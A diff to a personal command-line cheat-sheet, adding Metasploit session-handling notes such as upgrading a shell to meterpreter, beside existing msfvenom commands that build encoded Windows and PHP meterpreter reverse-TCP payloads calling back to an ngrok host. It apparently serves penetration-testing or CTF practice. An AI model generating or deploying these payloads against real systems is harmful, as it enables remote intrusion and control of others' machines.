@@ -1331,13 +1331,21 @@ bash/zsh + linux terminal cli tools commands
     - go to session: sessions -i 3
     - sessions: sessions
     - send session to background: bg
+    - send normal shell to background: ctrl+z
+    - shell to interpreter:
+      - use post/multi/manage/shell_to_meterpreter
+      - set SESSION 2
+      - {https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646}
     - meterpreter:
         - set handler: use exploit/multi/handler
         - php: set payload php/meterpreter/reverse_tcp
         - exploit: exploit -j
             - -j flag sends to background
         - post exploit:
+            - sysinfo
             - edit myfile
+        - backgorund session: bg
+        - go into session: sessions -i 2
 - msfvenom:
     - windows: msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 25 LHOST=0.tcp.ngrok.io LPORT=12345 -f exe > 1.exe
     - php: msfvenom -p php/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=12345 -f raw -o page.php
